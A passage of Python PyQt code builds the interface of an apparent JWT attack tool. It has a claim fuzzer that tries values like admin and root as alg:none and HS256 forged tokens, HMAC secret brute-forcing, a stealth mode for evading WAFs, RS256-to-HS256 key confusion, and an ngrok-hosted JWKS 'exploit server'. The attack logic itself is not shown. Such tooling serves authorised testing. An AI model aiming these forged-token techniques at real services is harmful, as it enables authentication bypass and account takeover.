        self.custom_secret_edit = QLineEdit()
        self.custom_secret_edit.setPlaceholderText("HMAC secret (for brute-force / claim tamper)")
        self.custom_secret_edit.setStyleSheet(self._input_style())
        gen_lay.addRow("Known Secret:", self.custom_secret_edit)

        self.wordlist_edit = QLineEdit()
        self.wordlist_edit.setText(self._default_jwt_wordlist())
        self.wordlist_edit.setStyleSheet(self._input_style())
        browse_wl = QPushButton("...")
        browse_wl.setFixedWidth(28)
        browse_wl.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        browse_wl.clicked.connect(self._browse_wordlist)
        wl_row = QHBoxLayout()
        wl_row.addWidget(self.wordlist_edit)
        wl_row.addWidget(browse_wl)
        gen_lay.addRow("Wordlist:", wl_row)
        atk_scroll_lay.addWidget(gen_grp)

        # ── Claim Fuzzer config ───────────────────────────────────────────
        fuzz_grp = QGroupBox("Claim Fuzzer")
        fuzz_grp.setStyleSheet(_grp)
        fuzz_lay = QFormLayout(fuzz_grp)
        fuzz_lay.setSpacing(4)
        fuzz_lay.setContentsMargins(6, 10, 6, 6)

        fuzz_name_row = QHBoxLayout()
        self.fuzz_claim_edit = QLineEdit()
        self.fuzz_claim_edit.setPlaceholderText("claim name, e.g. sub, role, email…")
        self.fuzz_claim_edit.setText("sub")
        self.fuzz_claim_edit.setStyleSheet(self._input_style())
        from_payload_btn = QPushButton("<> from payload")
        from_payload_btn.setToolTip("Pick claim key from the currently decoded JWT payload")
        from_payload_btn.setFixedWidth(100)
        from_payload_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        from_payload_btn.clicked.connect(self._pick_fuzz_claim)
        fuzz_name_row.addWidget(self.fuzz_claim_edit)
        fuzz_name_row.addWidget(from_payload_btn)
        fuzz_lay.addRow("Claim:", fuzz_name_row)

        _DEFAULT_FUZZ_VALUES = (
            "admin\nadministrator\nroot\nsuperadmin\nsuper_admin\n"
            "superuser\nsuper_user\noperator\nstaff\nmanager\n"
            "moderator\nguest\nanonymous\nsystem\nservice\nbot\n"
            "user\ntest\ndev\ntest@test.com\n"
            "0\n1\n2\ntrue\nfalse\nnull"
        )
        self.fuzz_values_edit = QTextEdit()
        self.fuzz_values_edit.setPlainText(_DEFAULT_FUZZ_VALUES)
        self.fuzz_values_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        self.fuzz_values_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT}; border:1px solid {COLOR_BORDER};"
        )
        self.fuzz_values_edit.setMinimumHeight(80)
        self.fuzz_values_edit.setMaximumHeight(100)
        self.fuzz_values_edit.setPlaceholderText("One value per line — add your own below the defaults")
        fuzz_lay.addRow("Values\n(one/line):", self.fuzz_values_edit)

        hint = QLabel("Each value is tried as alg:none (always) and HS256 (if 'Known Secret' is set)")
        hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        hint.setWordWrap(True)
        fuzz_lay.addRow("", hint)
        atk_scroll_lay.addWidget(fuzz_grp)

        atk_scroll_lay.addStretch()
        atk_scroll.setWidget(atk_scroll_content)
        atk_lay.addWidget(atk_scroll, 1)

        left_tabs.addTab(atk_widget, "Attack Config")

        # ══ Tab 4: Request Settings ═══════════════════════════════════════
        req_settings_widget = QWidget()
        rs_lay = QVBoxLayout(req_settings_widget)
        rs_lay.setContentsMargins(8, 8, 8, 8)
        rs_lay.setSpacing(10)

        # Preset buttons
        preset_grp = QGroupBox("Presets")
        preset_grp.setStyleSheet(self._grp_style())
        preset_lay = QHBoxLayout(preset_grp)
        preset_lay.setSpacing(8)

        def _apply_preset(delay: int, timeout: int, label_hint: str):
            self.delay_spin.setValue(delay)
            self.timeout_spin.setValue(timeout)

        fast_btn = QPushButton("Fast")
        fast_btn.setStyleSheet(self._btn_style(COLOR_SUCCESS if hasattr(self, '_COLOR_SUCCESS') else '#3a7a3a'))
        fast_btn.setToolTip("No delay, 10s timeout")
        fast_btn.clicked.connect(lambda: _apply_preset(0, 10, "fast"))
        fast_btn.setStyleSheet(
            f"QPushButton {{ background:#2d6a2d; color:{COLOR_TEXT_BRIGHT}; border:none;"
            f" border-radius:4px; padding:6px 18px; font-weight:bold; font-size:10pt; }}"
            f"QPushButton:hover {{ background:#3a8a3a; }}"
        )

        normal_btn = QPushButton("Normal")
        normal_btn.setToolTip("500ms delay, 20s timeout")
        normal_btn.clicked.connect(lambda: _apply_preset(500, 20, "normal"))
        normal_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))

        slow_btn = QPushButton("Slow (Stealth)")
        slow_btn.setToolTip("2000ms delay, 30s timeout — low noise")
        slow_btn.clicked.connect(lambda: _apply_preset(2000, 30, "slow"))
        slow_btn.setStyleSheet(
            f"QPushButton {{ background:#5a4a1a; color:{COLOR_TEXT_BRIGHT}; border:none;"
            f" border-radius:4px; padding:6px 18px; font-weight:bold; font-size:10pt; }}"
            f"QPushButton:hover {{ background:#7a6a2a; }}"
        )

        for b in [fast_btn, normal_btn, slow_btn]:
            preset_lay.addWidget(b)
        rs_lay.addWidget(preset_grp)

        # Manual controls
        ctrl_grp = QGroupBox("Manual Controls")
        ctrl_grp.setStyleSheet(self._grp_style())
        ctrl_form = QFormLayout(ctrl_grp)
        ctrl_form.setSpacing(8)
        ctrl_form.setContentsMargins(8, 10, 8, 8)

        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 60000)
        self.delay_spin.setValue(0)
        self.delay_spin.setSuffix(" ms")
        self.delay_spin.setToolTip("Delay between each forged-token request")
        self.delay_spin.setStyleSheet(self._input_style())
        delay_lbl = QLabel("Delay between requests:")
        delay_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        ctrl_form.addRow(delay_lbl, self.delay_spin)

        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 120)
        self.timeout_spin.setValue(20)
        self.timeout_spin.setSuffix(" s")
        self.timeout_spin.setToolTip("Per-request TCP timeout in seconds")
        self.timeout_spin.setStyleSheet(self._input_style())
        timeout_lbl = QLabel("Request timeout:")
        timeout_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        ctrl_form.addRow(timeout_lbl, self.timeout_spin)

        self.followredirect_cb = QCheckBox("Follow redirects")
        self.followredirect_cb.setChecked(False)
        self.followredirect_cb.setStyleSheet(f"color:{COLOR_TEXT};")
        ctrl_form.addRow("", self.followredirect_cb)

        rs_lay.addWidget(ctrl_grp)
        rs_lay.addStretch()

        info_lbl = QLabel(
            "Tip: Use Slow / Stealth mode when targeting WAFs or rate-limited endpoints.\n"
            "Delay is applied between every forged-token request."
        )
        info_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        info_lbl.setWordWrap(True)
        rs_lay.addWidget(info_lbl)

        # ══ Tab 4: Request Settings ═════════════════════════════════════════
        left_tabs.addTab(req_settings_widget, "Request Settings")

        # ── Run controls (always visible below tabs) ──────────────────────
        left_container = QWidget()
        lc_lay = QVBoxLayout(left_container)
        lc_lay.setContentsMargins(0, 0, 0, 0)
        lc_lay.setSpacing(4)
        lc_lay.addWidget(left_tabs, 1)

        run_row = QHBoxLayout()
        run_row.setSpacing(4)
        self.run_all_btn = QPushButton("Run All Tests")
        self.run_all_btn.setStyleSheet(self._btn_style(COLOR_CRITICAL))
        self.run_all_btn.clicked.connect(self._run_all_attacks)
        self.run_sel_btn = QPushButton("Run Selected")
        self.run_sel_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        self.run_sel_btn.clicked.connect(self._run_selected_attacks)
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        self.stop_btn.setEnabled(False)
        self.stop_btn.clicked.connect(self._stop_attacks)
        for b in [self.run_all_btn, self.run_sel_btn, self.stop_btn]:
            run_row.addWidget(b)
        lc_lay.addLayout(run_row)

        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setVisible(False)
        self.progress_bar.setStyleSheet(
            f"QProgressBar {{ border:1px solid {COLOR_BORDER}; border-radius:3px;"
            f" background:{COLOR_DARK_BG}; text-align:center; color:{COLOR_TEXT}; }}"
            f"QProgressBar::chunk {{ background:{COLOR_ACCENT}; border-radius:2px; }}"
        )
        lc_lay.addWidget(self.progress_bar)

        return left_container

    # ─────────────────────────────────────────────────────────────────────────────
    # Key Manager tab builder
    # ─────────────────────────────────────────────────────────────────────────────

    def _build_key_manager_tab(self) -> QWidget:
        """Build the Key Manager tab — generate/import/inspect RSA, EC, OKP and symmetric keys."""
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        # ── Toolbar ─────────────────────────────────────────────────────────────────
        toolbar = QHBoxLayout()
        toolbar.setSpacing(4)
        for label, slot, color in [
            ("+  Symmetric",  self._km_generate_symmetric, COLOR_ACCENT),
            ("+  RSA",        self._km_generate_rsa,        "#4A90D9"),
            ("+  EC",         self._km_generate_ec,         "#7B5EA7"),
            ("+  OKP",        self._km_generate_okp,        "#2E8B57"),
        ]:
            btn = QPushButton(label)
            btn.setStyleSheet(self._btn_style(color))
            btn.clicked.connect(slot)
            toolbar.addWidget(btn)
        toolbar.addStretch()
        import_jwk_btn = QPushButton("Import JWK")
        import_jwk_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        import_jwk_btn.clicked.connect(self._km_import_jwk)
        toolbar.addWidget(import_jwk_btn)
        import_pem_btn = QPushButton("Import PEM")
        import_pem_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        import_pem_btn.clicked.connect(self._km_import_pem)
        toolbar.addWidget(import_pem_btn)
        del_btn = QPushButton("Delete")
        del_btn.setStyleSheet(self._btn_style(COLOR_CRITICAL))
        del_btn.clicked.connect(self._km_delete_key)
        toolbar.addWidget(del_btn)
        lay.addLayout(toolbar)

        # ── Key list table ───────────────────────────────────────────────────────────
        self.km_table = QTableWidget(0, 4)
        self.km_table.setHorizontalHeaderLabels(["Type", "Algorithm", "Key ID (kid)", "Size"])
        hh = self.km_table.horizontalHeader()
        hh.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        hh.setSectionResizeMode(2, QHeaderView.Stretch)
        hh.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        self.km_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.km_table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.km_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.km_table.setAlternatingRowColors(True)
        self.km_table.verticalHeader().setVisible(False)
        self.km_table.setStyleSheet(self._table_style())
        self.km_table.setMaximumHeight(170)
        self.km_table.itemSelectionChanged.connect(self._km_on_key_selected)
        lay.addWidget(self.km_table)

        # ── Details panel ───────────────────────────────────────────────────────────
        detail_grp = QGroupBox("Key Details")
        detail_grp.setStyleSheet(self._grp_style())
        detail_lay = QVBoxLayout(detail_grp)
        detail_lay.setSpacing(4)
        detail_lay.setContentsMargins(6, 8, 6, 6)

        self.km_detail_tabs = QTabWidget()
        self.km_detail_tabs.setDocumentMode(True)
        self.km_detail_tabs.setStyleSheet(self._subtabs_style())

        self.km_jwk_pub_view = QTextEdit()
        self.km_jwk_pub_view.setReadOnly(True)
        self.km_jwk_pub_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.km_jwk_pub_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#61AFEF; border:none;"
        )
        JSONHighlighter(self.km_jwk_pub_view.document())
        self.km_detail_tabs.addTab(self.km_jwk_pub_view, "JWK (Public)")

        self.km_jwk_priv_view = QTextEdit()
        self.km_jwk_priv_view.setReadOnly(True)
        self.km_jwk_priv_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.km_jwk_priv_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#E06C75; border:none;"
        )
        JSONHighlighter(self.km_jwk_priv_view.document())
        self.km_detail_tabs.addTab(self.km_jwk_priv_view, "JWK (Private)")

        self.km_pem_pub_view = QTextEdit()
        self.km_pem_pub_view.setReadOnly(True)
        self.km_pem_pub_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.km_pem_pub_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#98C379; border:none;"
        )
        self.km_detail_tabs.addTab(self.km_pem_pub_view, "PEM (Public)")

        self.km_pem_priv_view = QTextEdit()
        self.km_pem_priv_view.setReadOnly(True)
        self.km_pem_priv_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.km_pem_priv_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_WARNING}; border:none;"
        )
        self.km_detail_tabs.addTab(self.km_pem_priv_view, "PEM (Private)")

        # ── JWKS-to-Host tab ─────────────────────────────────────────────
        self.km_jwks_host_view = QTextEdit()
        self.km_jwks_host_view.setReadOnly(True)
        self.km_jwks_host_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.km_jwks_host_view.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#E5C07B; border:none;"
        )
        JSONHighlighter(self.km_jwks_host_view.document())
        self.km_detail_tabs.addTab(self.km_jwks_host_view, "JWKS to Host")

        detail_lay.addWidget(self.km_detail_tabs)

        # Action buttons row
        act_row = QHBoxLayout()
        act_row.setSpacing(4)
        for lbl, attr in [
            ("Copy JWK (Pub)",  "km_jwk_pub_view"),
            ("Copy JWK (Priv)", "km_jwk_priv_view"),
            ("Copy PEM (Pub)",  "km_pem_pub_view"),
            ("Copy PEM (Priv)", "km_pem_priv_view"),
        ]:
            b = QPushButton(lbl)
            b.setStyleSheet(self._btn_style(COLOR_DARK_BG))
            b.clicked.connect(lambda _=False, a=attr:
                QApplication.clipboard().setText(getattr(self, a).toPlainText()))
            act_row.addWidget(b)
        copy_jwks_btn = QPushButton("Copy JWKS to Host")
        copy_jwks_btn.setToolTip("Copy the JWKS JSON to upload to your exploit server")
        copy_jwks_btn.setStyleSheet(self._btn_style("#8B6914"))
        copy_jwks_btn.clicked.connect(
            lambda: QApplication.clipboard().setText(self.km_jwks_host_view.toPlainText())
        )
        act_row.addWidget(copy_jwks_btn)
        use_btn = QPushButton("→  Use Public Key in Attacks")
        use_btn.setToolTip(
            "Copies the PEM public key into the RSA PubKey field (for RS256→HS256 attack)"
        )
        use_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        use_btn.clicked.connect(self._km_use_pubkey)
        act_row.addWidget(use_btn)
        detail_lay.addLayout(act_row)

        lay.addWidget(detail_grp, 1)

        hint = QLabel(
            "Keys are stored in memory for the current session only and are not saved to disk."
        )
        hint.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        hint.setWordWrap(True)
        lay.addWidget(hint)

        # ── Public Host Keys ─────────────────────────────────────────────
        srv_grp = QGroupBox("🌐  Public Host Keys")
        srv_grp.setStyleSheet(self._grp_style())
        srv_lay = QVBoxLayout(srv_grp)
        srv_lay.setContentsMargins(6, 8, 6, 6)
        srv_lay.setSpacing(4)

        # ── Row 1: Port / Path / status / Clear Log ──────────────────────
        pp_row = QHBoxLayout()
        pp_row.setSpacing(6)
        pp_row.addWidget(QLabel("Port:"))
        self.km_srv_port = QSpinBox()
        self.km_srv_port.setRange(1024, 65535)
        self.km_srv_port.setValue(8887)
        self.km_srv_port.setFixedWidth(72)
        self.km_srv_port.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        pp_row.addWidget(self.km_srv_port)
        pp_row.addSpacing(8)
        pp_row.addWidget(QLabel("Path:"))
        self.km_srv_path = QLineEdit("/jwks.json")
        self.km_srv_path.setFixedWidth(140)
        self.km_srv_path.setStyleSheet(self._input_style())
        pp_row.addWidget(self.km_srv_path)
        pp_row.addStretch()
        self.km_srv_status_lbl = QLabel("● Stopped")
        self.km_srv_status_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED}; font-weight:bold;"
        )
        pp_row.addWidget(self.km_srv_status_lbl)
        pp_row.addSpacing(8)
        clr_log_btn = QPushButton("Clear Log")
        clr_log_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        clr_log_btn.clicked.connect(lambda: self.km_srv_log.clear())
        pp_row.addWidget(clr_log_btn)
        srv_lay.addLayout(pp_row)

        # ── Row 2: Ngrok controls ─────────────────────────────────────────
        ngrok_ctrl_row = QHBoxLayout()
        ngrok_ctrl_row.setSpacing(4)
        self.km_ngrok_start_btn = QPushButton("🌐  Start Ngrok")
        self.km_ngrok_start_btn.setStyleSheet(self._btn_style("#4A90D9"))
        self.km_ngrok_start_btn.setToolTip(
            "Start local JWKS server + ngrok tunnel.\n"
            "Requires pyngrok (pip install pyngrok) or the ngrok binary on PATH.\n"
            "Authtoken is read from  Tools ➜ ⚙ Settings ➜ 🔑 Tokens."
        )
        self.km_ngrok_start_btn.clicked.connect(self._km_ngrok_start)
        ngrok_ctrl_row.addWidget(self.km_ngrok_start_btn)
        self.km_ngrok_stop_btn = QPushButton("■  Stop")
        self.km_ngrok_stop_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        self.km_ngrok_stop_btn.setEnabled(False)
        self.km_ngrok_stop_btn.clicked.connect(self._km_ngrok_stop)
        ngrok_ctrl_row.addWidget(self.km_ngrok_stop_btn)
        self.km_ngrok_autofill_cb = QCheckBox("Auto-fill Attacker URL")
        self.km_ngrok_autofill_cb.setChecked(True)
        self.km_ngrok_autofill_cb.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        ngrok_ctrl_row.addWidget(self.km_ngrok_autofill_cb)
        ngrok_ctrl_row.addStretch()
        # Public URL label + copy
        self.km_ngrok_url_lbl = QLabel("Public URL:  —")
        self.km_ngrok_url_lbl.setFont(
            QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8)
        )
        self.km_ngrok_url_lbl.setStyleSheet("color:#4A90D9;")
        ngrok_ctrl_row.addWidget(self.km_ngrok_url_lbl)
        copy_ngrok_url_btn = QPushButton("Copy")
        copy_ngrok_url_btn.setFixedWidth(46)
        copy_ngrok_url_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        copy_ngrok_url_btn.clicked.connect(
            lambda: QApplication.clipboard().setText(
                self.km_ngrok_url_lbl.text().replace("Public URL:  ", "")
            )
        )
        ngrok_ctrl_row.addWidget(copy_ngrok_url_btn)
        srv_lay.addLayout(ngrok_ctrl_row)

        # ── Access / event log ────────────────────────────────────────────
        self.km_srv_log = QTextEdit()
        self.km_srv_log.setReadOnly(True)
        self.km_srv_log.setFont(
            QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8)
        )
        self.km_srv_log.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_SUCCESS};"
            f" border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        self.km_srv_log.setMaximumHeight(110)
        self.km_srv_log.setPlaceholderText(
            "Event log — server start, ngrok URL, and incoming JKU callbacks appear here …"
        )
        srv_lay.addWidget(self.km_srv_log)

        # ── Footer hints ──────────────────────────────────────────────────
        hints_row = QHBoxLayout()
        hints_row.setSpacing(12)
        hint_ngrok = QLabel(
            "🔑 Authtoken: <b>Tools ➜ ⚙ Settings ➜ Tokens</b>"
        )
        hint_ngrok.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        hints_row.addWidget(hint_ngrok)
        hint_dep = QLabel("Requires: <tt>pip install pyngrok</tt>  or  ngrok binary on PATH")
        hint_dep.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:8pt;")
        hints_row.addWidget(hint_dep)
        hints_row.addStretch()
        security_note = QLabel(
            "⚠  Server binds 0.0.0.0 — use on isolated/trusted networks only."
        )
        security_note.setStyleSheet(f"color:{COLOR_WARNING}; font-size:8pt;")
        hints_row.addWidget(security_note)
        srv_lay.addLayout(hints_row)

        lay.addWidget(srv_grp)
        return w

    def _build_right_panel(self) -> QWidget:
        panel = QWidget()
        lay = QVBoxLayout(panel)
        lay.setContentsMargins(4, 0, 0, 0)
        lay.setSpacing(6)

        right_splitter = QSplitter(Qt.Vertical)

        # ── Attack Results ────────────────────────────────────────────────
        res_grp = QGroupBox("Attack Results")
        res_grp.setStyleSheet(self._grp_style())
        res_lay = QVBoxLayout(res_grp)

        res_toolbar = QHBoxLayout()
        clear_results_btn = QPushButton("Clear")
        clear_results_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        clear_results_btn.clicked.connect(self._clear_results)
        export_btn = QPushButton("Export")
        export_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        export_btn.clicked.connect(self._export_results)
        send_rep_btn = QPushButton("Send to Repeater")
        send_rep_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        send_rep_btn.clicked.connect(self._send_current_to_repeater)
        res_toolbar.addWidget(clear_results_btn)
        res_toolbar.addWidget(export_btn)
        res_toolbar.addWidget(send_rep_btn)
        res_toolbar.addStretch()
        res_lay.addLayout(res_toolbar)

        self.results_table = QTableWidget(0, 8)
        self.results_table.setHorizontalHeaderLabels([
            "#", "Attack", "Status", "Length", "Time(ms)", "Baseline", "Severity", "Token Preview"
        ])
        hdr = self.results_table.horizontalHeader()
        hdr.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(1, QHeaderView.Stretch)
        hdr.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(4, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(5, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(6, QHeaderView.ResizeToContents)
        hdr.setSectionResizeMode(7, QHeaderView.Stretch)
        self.results_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.results_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setStyleSheet(self._table_style())
        self.results_table.itemSelectionChanged.connect(self._on_result_selected)
        self.results_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.results_table.customContextMenuRequested.connect(self._result_context_menu)
        res_lay.addWidget(self.results_table)
        right_splitter.addWidget(res_grp)

        # ── HTTP Request / Response viewer ────────────────────────────────
        http_grp = QGroupBox("Request / Response")
        http_grp.setStyleSheet(self._grp_style())
        http_lay = QVBoxLayout(http_grp)

        http_splitter = QSplitter(Qt.Horizontal)

        req_box = QGroupBox("Sent Request")
        req_box.setStyleSheet(self._grp_style())
        req_box_lay = QVBoxLayout(req_box)
        self.detail_request_edit = QTextEdit()
        self.detail_request_edit.setReadOnly(True)
        self.detail_request_edit.setPlaceholderText(
            "The HTTP request sent (with forged token) will appear here..."
        )
        self.detail_request_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.detail_request_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT}; border:none;"
        )
        HttpSyntaxHighlighter(self.detail_request_edit.document())
        req_box_lay.addWidget(self.detail_request_edit)
        http_splitter.addWidget(req_box)

        resp_box = QGroupBox("Server Response")
        resp_box.setStyleSheet(self._grp_style())
        resp_box_lay = QVBoxLayout(resp_box)
        self.detail_response_edit = QTextEdit()
        self.detail_response_edit.setReadOnly(True)
        self.detail_response_edit.setPlaceholderText("The raw HTTP response will appear here...")
        self.detail_response_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.detail_response_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT}; border:none;"
        )
        HttpSyntaxHighlighter(self.detail_response_edit.document())
        resp_box_lay.addWidget(self.detail_response_edit)
        http_splitter.addWidget(resp_box)

        # ── JWT View panel (3rd panel: decoded token for selected result) ──
        jwt_view_box = QGroupBox("JWT View")
        jwt_view_box.setStyleSheet(self._grp_style())
        jwt_view_lay = QVBoxLayout(jwt_view_box)
        jwt_view_lay.setSpacing(4)

        self.jwt_view_token = QLineEdit()
        self.jwt_view_token.setReadOnly(True)
        self.jwt_view_token.setPlaceholderText("Forged JWT token (select a result row)...")
        self.jwt_view_token.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        self.jwt_view_token.setStyleSheet(self._input_style())
        jwt_copy_btn = QPushButton("Copy")
        jwt_copy_btn.setFixedWidth(42)
        jwt_copy_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        jwt_copy_btn.clicked.connect(lambda: QApplication.clipboard().setText(self.jwt_view_token.text()))
        tok_row = QHBoxLayout()
        tok_row.addWidget(self.jwt_view_token)
        tok_row.addWidget(jwt_copy_btn)
        jwt_view_lay.addLayout(tok_row)

        # Header label + editor
        hdr_lbl = QLabel("Header")
        hdr_lbl.setStyleSheet(f"color:#61AFEF; font-size:8pt; font-weight:bold; padding-top:4px;")
        jwt_view_lay.addWidget(hdr_lbl)
        self.jwt_view_header = QTextEdit()
        self.jwt_view_header.setReadOnly(True)
        self.jwt_view_header.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.jwt_view_header.setStyleSheet(f"background:{COLOR_DARK_BG}; color:#61AFEF; border:1px solid {COLOR_BORDER}; border-radius:3px;")
        self.jwt_view_header.setMaximumHeight(110)
        JSONHighlighter(self.jwt_view_header.document())
        jwt_view_lay.addWidget(self.jwt_view_header)

        # Payload label + editor
        pay_lbl = QLabel("Payload")
        pay_lbl.setStyleSheet(f"color:#98C379; font-size:8pt; font-weight:bold; padding-top:4px;")
        jwt_view_lay.addWidget(pay_lbl)
        self.jwt_view_payload = QTextEdit()
        self.jwt_view_payload.setReadOnly(True)
        self.jwt_view_payload.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.jwt_view_payload.setStyleSheet(f"background:{COLOR_DARK_BG}; color:#98C379; border:1px solid {COLOR_BORDER}; border-radius:3px;")
        JSONHighlighter(self.jwt_view_payload.document())
        jwt_view_lay.addWidget(self.jwt_view_payload, 1)

        notes_lbl = QLabel("Notes / Exploit Context")
        notes_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED}; font-size:8pt; font-weight:bold; padding-top:4px;"
        )
        jwt_view_lay.addWidget(notes_lbl)
        self.jwt_view_notes = QTextEdit()
        self.jwt_view_notes.setReadOnly(True)
        self.jwt_view_notes.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        self.jwt_view_notes.setMaximumHeight(140)
        self.jwt_view_notes.setPlaceholderText(
            "Attack notes, JWKS to host, cert PEM, or description will appear here..."
        )
        self.jwt_view_notes.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:#ABB2BF; border:1px solid {COLOR_BORDER}; border-radius:3px;"
        )
        jwt_view_lay.addWidget(self.jwt_view_notes)

        http_splitter.addWidget(jwt_view_box)

        http_splitter.setSizes([1, 1, 1])
        http_lay.addWidget(http_splitter)
        right_splitter.addWidget(http_grp)
        right_splitter.setSizes([400, 300])

        lay.addWidget(right_splitter, 1)
        return panel

    # ─────────────────────────────────────────────────────────────────────
    # Style helpers
    # ─────────────────────────────────────────────────────────────────────

    def _get_ngrok_headers(self) -> Dict[str, str]:
        """Return extra headers to inject when the attacker URL is a ngrok tunnel.

        ngrok free-tier tunnels redirect browsers to a warning page unless a
        client sends  ``ngrok-skip-browser-warning: true``.  When the target
        server fetches the JWT's jku/x5u URL its HTTP client is not a browser,
        but adding this header to *every* request in that test run ensures the
        bypass is in place for any path that traverses the tunnel.
        """
        url = self.attacker_url_edit.text().strip()
        if "ngrok" in url.lower():
            return {"ngrok-skip-browser-warning": "true"}
        return {}

    def _default_jwt_wordlist(self) -> str:
        """Return the JWT secrets wordlist path derived from the configured Seclists directory."""
        _JWT_WL_REL = "Passwords/scraped-JWT-secrets.txt"
        # 1. Try configured seclists_dir from Tool Settings
        parent = self._parent_gui
        if parent is not None:
            settings = getattr(parent, "_global_settings", {})
            seclists_dir = settings.get("seclists_dir", "").strip()
            if seclists_dir:
                candidate = os.path.join(seclists_dir, _JWT_WL_REL)
                if os.path.isfile(candidate):
                    return candidate
                # Return the path even if the file doesn't exist yet
                return candidate
        # 2. Auto-detect from common install locations
        for base in ("/usr/share/seclists", "/usr/share/SecLists",
                     os.path.expanduser("~/SecLists"), os.path.expanduser("~/seclists"),
                     "/opt/seclists", "/opt/SecLists"):
            candidate = os.path.join(base, _JWT_WL_REL)
            if os.path.isfile(candidate):
                return candidate
        # 3. Best-guess fallback
        return f"/usr/share/seclists/{_JWT_WL_REL}"

    def _grp_style(self) -> str:
        return (
            f"QGroupBox {{ color:{COLOR_TEXT_BRIGHT}; font-weight:bold;"
            f" border:1px solid {COLOR_BORDER}; border-radius:4px;"
            f" margin-top:8px; padding-top:4px; background:{COLOR_CARD_BG}; }}"
            f"QGroupBox::title {{ subcontrol-origin:margin; left:8px; padding:0 4px; }}"
        )

    def _btn_style(self, bg: str) -> str:
        return (
            f"QPushButton {{ background:{bg}; color:{COLOR_TEXT_BRIGHT}; border:none;"
            f" border-radius:4px; padding:5px 12px; font-weight:bold; font-size:9pt; }}"
            f"QPushButton:hover {{ opacity:0.85; }}"
            f"QPushButton:disabled {{ background:{COLOR_DARK_BG}; color:{COLOR_TEXT_MUTED}; }}"
        )

    def _input_style(self) -> str:
        return (
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:4px; padding:3px 6px;"
        )

    def _subtabs_style(self) -> str:
        return (
